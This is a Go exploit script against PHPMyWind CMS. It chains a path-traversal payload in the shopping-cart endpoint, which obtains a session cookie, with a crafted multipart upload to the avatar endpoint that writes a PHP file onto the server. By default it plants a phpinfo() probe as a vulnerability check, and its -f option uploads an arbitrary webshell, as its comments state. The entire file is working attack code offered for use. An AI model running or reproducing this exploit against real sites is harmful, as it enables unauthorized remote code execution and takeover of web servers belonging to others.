package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"github.com/go-resty/resty"
	"io/ioutil"
	"strings"
)

var (
	url      string
	path     string
	file     string
	payload1 = "shoppingcart.php?a=addshopingcart&goodsid=1&buynum=2&goodsattr=as%26time=999999999999999999%26uid=/../../../../../../{path}/1.php%26a=1"
	payload2 = "data/avatar/upload.php?a=uploadavatar&input={cookie}&_SERVER[HTTP_USER_AGENT][]=1"
	body    = `-----------------------------358400350218435578672887741538
Content-Disposition: form-data; name="Filedata"; filename="1.png"
Content-Type: image/png

{php}
#define width 20
#define height 20
-----------------------------358400350218435578672887741538--`
)

func init() {
	flag.StringVar(&url, "u", "", "PHPMyWind CMS URL")
	flag.StringVar(&path, "p", "", "Absolute site path")
	flag.StringVar(&file, "f", "", "Select the file to upload by default phpinfo();")
	flag.Parse()
}

func eCookie() string {
	//获取cookie
	paths := strings.Replace(payload1, "{path}", path, 1)
	client := resty.New()
	resp, _ := client.R().
		Get(url + paths)
	if resp.StatusCode() == 200 {
		head := resp.Header()
		if _, ok := head["Set-Cookie"]; ok {
			c, _ := json.Marshal(head["Set-Cookie"])
			fuzz_cookie := string(c)[15 : len(c)-2]
			return fuzz_cookie
		}
	}
	return ""
}

func ePhpinfo() bool {
	//上传phpinfo();
	cookie := eCookie()
	if cookie != "" {
		paths := strings.Replace(payload2, "{cookie}", cookie, 1)
		phpinfo := strings.Replace(body, "{php}", "<?php phpinfo();?>", 1)
		client := resty.New()
		resp, _ := client.R().
			SetHeader("Content-Type", "multipart/form-data; boundary=---------------------------358400350218435578672887741538").
			SetBody(phpinfo).
			Post(url + paths)
		if resp.StatusCode() == 200 && strings.Contains(resp.String(), "1.php") {
			return true
		} else {
			return false
		}
	} else {
		return false
	}

}

func eUpload() bool {
	//上传webshell
	shell, _ := ioutil.ReadFile(file)
	cookie := eCookie()
	if cookie != "" {
		paths := strings.Replace(payload2, "{cookie}", cookie, 1)
		webshell := strings.Replace(body, "{php}", string(shell), 1)
		client := resty.New()
		resp, _ := client.R().
			SetHeader("Content-Type", "multipart/form-data; boundary=---------------------------358400350218435578672887741538").
			SetBody(webshell).
			Post(url + paths)
		if resp.StatusCode() == 200 && strings.Contains(resp.String(), "1.php") {
			return true
		} else {
			return false
		}
	} else {
		return false
	}
}

func main() {
	if len(file) < 1 {
		state := ePhpinfo()
		if state {
			fmt.Println("[!] 不安全的PHPMyWind Link:", url+"1.php")
		} else {
			fmt.Println("[*] 安全的PHPMyWind")
		}
	} else {
		state := eUpload()
		if state {
			fmt.Println("[!] 不安全的PHPMyWind Link:", url+"1.php")
		} else {
			fmt.Println("[*] 安全的PHPMyWind")
		}
	}
}
